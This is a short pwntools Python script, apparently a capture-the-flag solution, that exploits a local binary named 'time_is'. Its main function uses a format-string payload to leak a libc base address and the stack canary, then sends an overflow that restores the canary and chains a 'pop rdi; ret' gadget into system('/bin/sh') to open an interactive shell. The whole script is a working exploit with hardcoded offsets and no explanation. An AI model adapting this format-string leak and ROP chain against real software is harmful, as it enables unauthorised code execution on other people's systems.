#!/usr/bin/env python

from pwn import *

canary_off = 2056
stack_off = 2120

def rebase(addy,libc):
    return addy+libc


#rsp+0x838 -> canary
#0x0040071a after canary on stack
#0x400970 just before printf is called
#0x400975 after vuln printf call
# 0x7ffe2fe66428 -> canary
def main():
    r=process("./time_is") 
    
    # Just to find offset to format string itself
    #r.sendline("A"*8+"|%p"*30)
    r.sendline("%p."*267 + "%p" + "%08x")
    leak=r.recvlines(2)[1]
    libc=int(leak.split(".")[5],16)
    libc=libc - 0x39d4a0
    canary=int(leak.split(":")[-3].split('.')[-1].replace("0000000000","00"),16)
    
    system_off=0x3f460
    binsh_off=0x161879
    
    log.info("Result: {}".format(leak))
    log.info("Libc: %s",hex(libc))
    log.info("System: %s",hex(libc+system_off))
    log.info("Binsh: %s",hex(libc+binsh_off))
    log.info("Canary: %s",hex(canary))
    raw_input("[DEBUG] PID: %d" % r.proc.pid)

    rop_pop_rdi_ret = 0x400BA3
    rop="X"*0x808 + p64(canary) + "AAAAAAAA"*7 + p64(rop_pop_rdi_ret) + p64(libc+binsh_off) + p64(libc+system_off)
    r.sendline(rop)
    r.clean()
    r.interactive()
if __name__=="__main__":
    main()